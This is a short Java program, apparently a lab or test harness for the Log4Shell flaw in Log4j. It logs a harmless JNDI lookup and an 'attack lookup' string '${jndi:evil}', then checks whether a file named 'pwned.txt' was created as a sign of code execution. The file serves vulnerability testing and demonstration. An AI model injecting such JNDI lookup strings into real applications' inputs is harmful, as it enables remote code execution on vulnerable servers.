import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Victim {
	public static void main(String[] args) throws Exception {
		Logger log = LogManager.getLogger(Victim.class);
		log.error("legit lookup  -> ${jndi:config/appname}");
		log.error("attack lookup -> ${jndi:evil}");
		log.error("still logging after the attack");
		System.out.println("pwned.txt created: " + new java.io.File("pwned.txt").exists());
	}
}
